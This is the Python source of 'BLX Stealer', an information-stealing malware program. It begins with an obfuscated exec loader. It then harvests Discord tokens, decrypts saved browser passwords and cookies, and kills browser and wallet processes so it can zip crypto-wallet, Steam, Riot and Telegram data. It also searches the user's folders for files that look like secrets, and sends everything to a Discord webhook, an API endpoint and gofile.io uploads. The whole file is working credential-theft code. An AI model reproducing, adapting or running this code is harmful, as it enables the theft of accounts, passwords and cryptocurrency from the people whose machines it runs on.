MMNNNMMNMNNNNNNNMNMNNNNN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(MMNNNMMNMNNNNNNNMNMNNNNN)"),filename='\x4d\x4e\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4d\x4d\x4d\x4d\x4e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda JJLLLIILLIIIJIJIIJIJLL,MMNNNMMNMNNNNNNNMNMNNNNN:JJLLLIILLIIIJIJIIJIJLL(MMNNNMMNMNNNNNNNMNMNNNNN))
        if 126546 > 3288578:
            _calculate.Statistics(_memoryaccess = 9779 * _calculate.CallFunction)
        elif 339039 < 5802078:
            _calculate.Builtins(Negative = _calculate.CallFunction + -23387)                                                                                                                                                                                                                                                          ;WXWXWXWXXXWXXWXXWWW()(XWWWXXWXXXXWWXWXXWXW(ooooDoOOOOOoODooOOo(wwxwxwxwxxxxxxxxwxw(WWWWWWXWXXWXXWWWWWXWWXWX('\x76\x61\x72\x73'))),Ceil.Invert(Multiply='OoODDODODoDoOoDDoOD')+Ceil.Invert(Multiply='WWXWWXXXXXXXXXXXWXW')+Ceil.Invert(Multiply='NNMNMNMMMMMMMNMNNNNMN')))

    except Exception as _math:
        if 240005 > 9919620:
            Ceil.execute(code = _builtins(_math))

        elif 316070 > 9377007:
            _calculate.Builtins(Negative = _calculate.CallFunction - 84344)
            
def UP104D70K3N(token, path):
    global hook
    global api_connection
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)


    if pfp == None: 
        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = G37UHQFr13ND5(token)
    if friends == '': friends = "No HQ Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{g108411NF0()} | Found in `{path}`',
        "embeds": [
            {
            "color": color,
            "fields": [
                {
                    "name": "<:hackerblack:1095747410539593800> Token:",
                    "value": f"`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<:mail:1095741024678191114> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:phone:1095741029832990720> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackworld:1095741984385290310> IP:",
                    "value": f"`{g371P()}`",
                    "inline": True
                },
                {
                    "name": "<a:black_hypesquad:1095742323423453224> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:blackmember:1095740314683179139>  HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "BLX Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
        "username": "BLX Stealer | t.me/blxstealer",
        "attachments": []
        }
    urlopen(Request(api_connection, data=dumps(data).encode(), headers=headers))
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    

def R3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "lxcook":
        rb = ' | '.join(da for da in c00K1W0rDs)
        if len(rb) > 1000: 
            rrrrr = R3F0rM47(str(c00K1W0rDs))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(api_connection, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "lxpassw":
        ra = ' | '.join(da for da in p45WW0rDs)
        if len(ra) > 1000: 
            rrr = R3F0rM47(str(p45WW0rDs))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(api_connection, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                "color": color,
                "fields": [
                    {
                    "name": "I Found This Files;:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "BLX Stealer | Files"
                },
                "footer": {
                    "text": "BLX Stealer",
                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(api_connection, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\lx{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--BLXStealer-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0K3Ns = ''
def g3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                # print(token)
                                T0K3Ns += token
                                UP104D70K3N(token, path)

P455w = []
def g37P455W(path, arg):
    global P455w, P455WC0UNt
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in p45WW0rDs: p45WW0rDs.append(old)
            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
            P455WC0UNt += 1
    wr173F0rF113(P455w, 'passw')

C00K13s = []    
def g37C00K13(path, arg):
    global C00K13s, C00K1C0UNt
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
            C00K1C0UNt += 1
    wr173F0rF113(C00K13s, 'cook')

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0K3Ns
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CH3CK70K3N(tokenDecoded):
                        if not tokenDecoded in T0K3Ns:
                            # print(token)
                            T0K3Ns += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
        # print(WalletsZip, G4M1N6Z1p, OtherZip)

    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236> •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(W411375Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": g108411NF0(),
        "embeds": [
            {
            "title": "BLX Stealer | Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": color,
            "footer": {
                "text": "BLX Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
            }
            }
        ],
        "username": "BLX Stealer | t.me/blxstealer",
        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
        "attachments": []
    }
    urlopen(Request(api_connection, data=dumps(data).encode(), headers=headers))
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)


def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg

    if "djclckkglechooblngghdinmeemkbgci" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_OperaGX"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg:
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
        

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"              ]
    ]

    d15C0rDP47H5 = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    P47H570Z1P = [
        [f"{roaming}/Atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g3770K3N, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in d15C0rDP47H5: 
        a = threading.Thread(target=G37D15C0rD, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37P455W, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TrU57(C00K13s)
    if DETECTED == True: return

    for thread in Threadlist: 
        thread.join()
    global uP7Hs
    uP7Hs = []

    for file in ["lxpassw.txt", "lxcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        UP104D(file.replace(".txt", ""), uP104D7060F113(os.getenv("TEMP") + "\\" + file))


def uP104D7060F113(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "seed",
        "seedphrase"
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "wallets",
        "crypto",
        "exodus",
        "seed",
        "seedphrase"
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p

k3YW0rd = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

C00K1C0UNt, P455WC0UNt = 0, 0
c00K1W0rDs = []
p45WW0rDs = []

W411375Z1p = [] # [Name, Link]
G4M1N6Z1p = []
O7H3rZ1p = []

G47H3r411()
DETECTED = TrU57(C00K13s)
# DETECTED = False
if not DETECTED:
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)